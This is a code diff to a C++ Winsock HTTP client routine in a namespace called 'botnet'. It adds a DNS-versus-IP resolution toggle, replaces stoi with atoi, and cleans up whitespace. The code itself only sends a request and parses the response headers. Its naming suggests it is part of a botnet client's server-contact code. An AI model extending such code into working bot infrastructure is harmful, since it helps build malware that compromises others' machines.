@@ -36,12 +36,16 @@ namespace botnet {
             Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
             struct hostent *host;
-            /*addr.s_addr = inet_addr(_url.c_str());
-            if (addr.s_addr == INADDR_NONE)
-                return false;*/
+            if (dns_ == false) {
+                addr.s_addr = inet_addr(_url.c_str());
+                if (addr.s_addr == INADDR_NONE)
+                    return false;
 
-            /*host = gethostbyaddr((char *)&addr, 4, AF_INET);*/
-            host = gethostbyname(_url.c_str());
+                host = gethostbyaddr((char *)&addr, 4, AF_INET);
+            } else {
+                host = gethostbyname(_url.c_str());
+            }
+
             dwError = WSAGetLastError();
             if (host == NULL)
                 return false;
@@ -63,11 +67,11 @@ namespace botnet {
             send(Socket, requisition.c_str(), requisition.length(), 0);
 
             do {
-                
+
                 nrecv = recv(Socket, buffer, BUFFER_LEN, 0);
                 if (nrecv == SOCKET_ERROR)
                     return false;
-                
+
                 if (nrecv > 0) {
                     buffer[nrecv] = '\0';
                     recvd += nrecv;
@@ -88,9 +92,9 @@ namespace botnet {
                                 std::string value = arr[i].substr(found + 2, found_ln);
                                 hmap[key] = value;
                                 if (key == "Content-Length") {
-                                    content_length = std::stoi(value);
+                                    content_length = atoi(value.c_str());
                                 }
-                                    
+
                             }
                         }
                     }
@@ -99,15 +103,15 @@ namespace botnet {
                         _body = _code.substr(body_start + 4);
                         break;
                     }
-                        
+
                 }
 
             } while (nrecv > 0);
-            
+
             closesocket(Socket);
             WSACleanup();
 
-            return true;            
+            return true;
         }
     }
 }
